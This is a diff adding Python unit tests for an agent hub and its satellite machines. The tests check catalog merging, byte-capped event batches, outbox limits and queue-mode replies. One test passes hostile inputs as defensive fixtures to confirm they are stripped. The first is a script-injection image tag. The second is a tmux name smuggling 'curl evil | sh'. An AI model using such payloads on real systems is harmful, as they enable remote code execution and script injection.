@@ -121,6 +121,24 @@ class TestRemoteCatalog(unittest.TestCase):
         loaded = catalog_mod.load_remote_rows(self.home)
         self.assertEqual([r["key"] for r in loaded], ["claude:a@m1"])
 
+    def test_merge_keeps_only_pane_names_supervise_makes(self):
+        """A satellite's tmux name lands in web markup and a pasted shell
+        line, so anything but ``qv-<hex>`` is dropped from the row."""
+        good = supervise.tmux_name("claude:a")
+        rows = [
+            {"key": "claude:a", "tmux": good},
+            {"key": "claude:b", "tmux": '<img src=x onerror="alert(1)">'},
+            {"key": "claude:c", "tmux": "qv-1; curl evil | sh"},
+            {"key": "claude:d", "tmux": None},
+            {"key": "claude:e"},
+        ]
+        out = {r["key"]: r for r in
+               catalog_mod.merge_remote_rows(self.home, "m1", rows)}
+        self.assertEqual(out["claude:a@m1"]["tmux"], good)
+        for key in ("claude:b@m1", "claude:c@m1", "claude:d@m1",
+                    "claude:e@m1"):
+            self.assertNotIn("tmux", out[key], key)
+
     def test_refresh_includes_remote_rows_not_tailed(self):
         cat = catalog_mod.Catalog(self.home, "localmid",
                                   fetch_sessions=lambda: [],
@@ -640,7 +658,8 @@ class TestAgentRoutes(unittest.TestCase):
         self.assertEqual(status, 202)
         body = json.loads(data)
         self.assertTrue(body["queued"])
-        # Same shape as the local 202; an idle row isn't waiting.
+        # Same shape as the local 202; waiting stays false (the
+        # satellite waits itself; nothing parks in the hub's tray).
         self.assertEqual(body["client_id"], "cid-9")
         self.assertFalse(body["waiting"])
         replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
@@ -1215,6 +1234,65 @@ class TestAgentEdges(unittest.TestCase):
     def test_push_events_empty_ok(self):
         self.assertTrue(self._agent()._push_events())
 
+    def test_push_events_cuts_batches_by_bytes(self):
+        # 50 events of 200 KB each are ~10 MB: the hub would refuse that
+        # body with a 400 forever. Each POST stays under the cap.
+        ag = self._agent()
+        ag.outbox = [{"type": "notify", "seq": i, "data": {"x": "a" * 200_000}}
+                     for i in range(1, 51)]
+        sizes = []
+
+        def post(hub, path, cred, payload, timeout=10.0):
+            sizes.append(len(json.dumps(payload).encode()))
+            return 200, {}
+
+        with patch.object(agent_mod, "_post", side_effect=post):
+            while ag.outbox:
+                self.assertTrue(ag._push_events())
+        self.assertGreater(len(sizes), 1)
+        self.assertTrue(all(n <= agent_mod.EVENTS_BODY_MAX + 1024
+                            for n in sizes))
+        self.assertEqual(ag._outbox_ack, 50)
+
+    def test_push_events_clips_an_oversized_event(self):
+        ag = self._agent()
+        ag.outbox = [{"type": "notify", "seq": 1,
+                      "data": {"kind": "x", "text": "a" * (6 << 20)}}]
+        with patch.object(agent_mod, "_post", return_value=(200, {})) as post:
+            self.assertTrue(ag._push_events())
+        sent = post.call_args[0][3]["events"][0]
+        self.assertTrue(sent["data"]["text"].endswith("(truncated)"))
+        self.assertEqual(sent["data"]["kind"], "x")
+        self.assertLessEqual(len(json.dumps(sent).encode()),
+                             agent_mod.EVENTS_BODY_MAX)
+        self.assertEqual(ag._outbox_ack, 1)
+
+    def test_push_events_acks_past_an_unclippable_event(self):
+        # Many short strings can't be clipped under the cap: the event
+        # is dropped and acked, and the next one still goes.
+        ag = self._agent()
+        ag.outbox = [{"type": "notify", "seq": 1,
+                      "data": {"parts": ["b" * 500] * 20_000}},
+                     {"type": "notify", "seq": 2, "data": {}}]
+        with patch.object(agent_mod, "_post", return_value=(200, {})) as post:
+            self.assertTrue(ag._push_events())
+        self.assertEqual(post.call_args[0][3]["events"],
+                         [{"type": "notify", "seq": 2, "data": {}}])
+        self.assertEqual(ag._outbox_ack, 2)
+        self.assertEqual(ag.outbox, [])
+
+    def test_outbox_is_bounded(self):
+        ag = self._agent()
+        with patch.object(agent_mod, "OUTBOX_MAX", 3):
+            for i in range(5):
+                ag._capture("k", protocol.event("notify", "k", ag.machine_id,
+                                                {"kind": "finished", "i": i}))
+            self.assertEqual([e["data"]["i"] for e in ag.outbox], [2, 3, 4])
+            # A failed push requeues without growing past the bound.
+            with patch.object(agent_mod, "_post", return_value=(0, {})):
+                self.assertFalse(ag._push_events())
+            self.assertEqual(len(ag.outbox), 3)
+
     def test_push_catalog_posts_rows(self):
         ag = self._agent()
         ag.catalog._fetch = lambda: []
@@ -1449,6 +1527,23 @@ class TestAgentRouteValidation(unittest.TestCase):
             "POST", f"/v1/sessions/{key}/nonsense", {},
             headers=self.srv.auth)
         self.assertEqual(status, 404)
+
+    def test_satellite_queue_send_never_says_waiting(self):
+        # The row says mid-turn, but the hub holds nothing to act on,
+        # so a client must not park the send in its tray.
+        self.srv.request(
+            "POST", "/v1/agent/catalog",
+            {"machine_id": self.mid, "rows": [
+                {"key": "claude:r1", "ownership": "attached",
+                 "status": "active"}]},
+            headers=self.srv.sat_auth)
+        self.srv.state.catalog.refresh()
+        status, data = self.srv.request(
+            "POST", "/v1/sessions/claude%3Ar1%40sat-m1/message",
+            {"text": "later", "mode": "queue", "client_id": "q-9"},
+            headers=self.srv.auth)
+        self.assertEqual(status, 202)
+        self.assertFalse(json.loads(data)["waiting"])
 
     def test_satellite_queue_tray_is_empty_and_actions_409(self):
         # A satellite waits for idle on its own machine, so nothing
@@ -2070,6 +2165,26 @@ class TestSatelliteQueueMode(unittest.TestCase):
         self.fake.send.assert_not_called()
         self.assertEqual(self.ag._done_cmd_seq, 0)  # replays on restart
         self.assertEqual(self._results(), [])
+
+    def test_missing_session_stops_waiting(self):
+        self.ag.catalog.session_for = lambda k: None
+        self._frame(1)
+        self._wait(lambda: self.ag._done_cmd_seq == 1)
+        [res] = self._results()
+        self.assertFalse(res["ok"])
+        self.assertIn("unknown session", res["note"])
+
+    def test_probe_sees_the_tailers_activity_time(self):
+        # The catalog copy is stale (timestamp 0); the tailer saw the
+        # transcript move just now, and the probe gets that time.
+        seen = []
+        self.ag.status_of = lambda sessions: seen.append(
+            sessions[0].timestamp) or ["active"]
+        self.ag.tail_manager.last_append["claude:s1"] = 1000.0
+        self.ag.tail_manager.tailers["claude:s1"] = MagicMock(
+            session=self.sess, source=MagicMock(path=None))
+        self.ag._live_status("claude:s1", {})
+        self.assertEqual(seen, [1000.0 * 1000])
 
     def test_live_status_prefers_fresh_probe(self):
         self.ag.tail_manager.statuses["claude:s1"] = "active"
